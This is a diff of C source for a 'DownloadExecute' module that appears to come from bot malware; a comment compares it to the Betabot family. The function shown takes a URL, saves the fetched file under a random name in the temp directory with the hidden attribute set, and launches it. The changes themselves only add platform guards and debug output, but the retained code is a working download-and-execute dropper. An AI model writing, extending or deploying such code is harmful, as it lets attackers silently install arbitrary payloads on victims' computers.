@@ -1,15 +1,19 @@
 #include "DownloadExecute.h"
 #include "HttpQuery.h"
-#include "WebSiteChecker.h"
-#include <Windows.h>
+#include "WebsiteChecker.h"
+#include "WindowsCompat.h"
 #include "StringOperations.h"
 #include <time.h>
 
-// This is similar in betabot :P 
+// This is similar in betabot :P
 
 void gen_random(char *s, const int len);
 
 bool DownloadExecuteFile(char* filePath) {
+#ifdef _DEBUG_
+	printf("DownloadExecuteFile(%s).\n", filePath);
+#endif
+#ifdef __WIN32
 	char* host;
 	char* path;
 	if (!URLToHostPath(filePath, &host, &path)) return false;
@@ -46,7 +50,7 @@ bool DownloadExecuteFile(char* filePath) {
 	free(join);
 	free(randomName);
 	free(tempDir);
-	
+
 
 	HANDLE file = CreateFileA(output, GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0x2, NULL);
 	if (file == 0) {
@@ -71,7 +75,7 @@ bool DownloadExecuteFile(char* filePath) {
 	ZeroMemory(&pi, sizeof(pi));
 
 	si.cb = sizeof(STARTUPINFOA);
-	
+
 	join = (char**)malloc(sizeof(char**) * 3);
 	join[0] = " \"";
 	join[1] = output;
@@ -93,6 +97,9 @@ bool DownloadExecuteFile(char* filePath) {
 		DWORD err = GetLastError();
 		return false;
 	}
+#else
+	return false;
+#endif
 }
 
 void gen_random(char *s, const int len) {
